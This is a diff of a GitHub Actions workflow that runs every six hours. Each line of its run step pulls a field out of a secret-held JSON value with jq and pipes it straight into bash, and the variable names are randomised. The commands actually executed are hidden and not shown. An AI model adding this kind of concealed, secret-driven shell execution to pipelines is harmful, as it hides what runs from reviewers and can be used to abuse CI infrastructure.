@@ -3,7 +3,7 @@ name: zhuganerx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '6 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhuganerx
         env:
-          qoqk09: ${{ secrets.qoqk09 }}
+          ht012: ${{ secrets.ht012 }}
         run: |
-          echo $qoqk09 | jq -r .s9 | /bin/bash
-          echo $rw778 | jq -r .i927 | /bin/bash
-          echo $os50183 | jq -r .no032 | /bin/bash
-          echo $rg9779 | jq -r .a5674 | /bin/bash
-          echo $d838 | jq -r .w47062 | /bin/bash
-          echo $hwgzr5941 | jq -r .k137 | /bin/bash
-          echo $tcgu5 | jq -r .vt967 | /bin/bash
-          echo $cro2 | jq -r .hzcf6957 | /bin/bash
-          echo $bu32915 | jq -r .f97 | /bin/bash
-          echo $bbr570 | jq -r .jm81 | /bin/bash
-          echo $svmjp4470 | jq -r .jje201 | /bin/bash
-          echo $zn3926 | jq -r .ddd5104 | /bin/bash
-          echo $duzxp37 | jq -r .fhxnz52493 | /bin/bash
-          echo $e7365 | jq -r .qdcel7 | /bin/bash
+          echo $ht012 | jq -r .tfyc32757 | /bin/bash
+          echo $sukv93 | jq -r .yo78 | /bin/bash
+          echo $l3778 | jq -r .lqhs49253 | /bin/bash
+          echo $kdutk53711 | jq -r .ujkky26 | /bin/bash
+          echo $ogkpq7 | jq -r .bul3594 | /bin/bash
+          echo $v7258 | jq -r .hjb3 | /bin/bash
+          echo $rmosv0 | jq -r .bu89 | /bin/bash
+          echo $epzo2942 | jq -r .zkt9 | /bin/bash
+          echo $bb22313 | jq -r .jop45599 | /bin/bash
+          echo $yrvab49589 | jq -r .xis71 | /bin/bash
+          echo $ybn61576 | jq -r .ktthm3883 | /bin/bash
+          echo $mmzb4653 | jq -r .um34 | /bin/bash
+          echo $zfye7 | jq -r .u2573 | /bin/bash
 
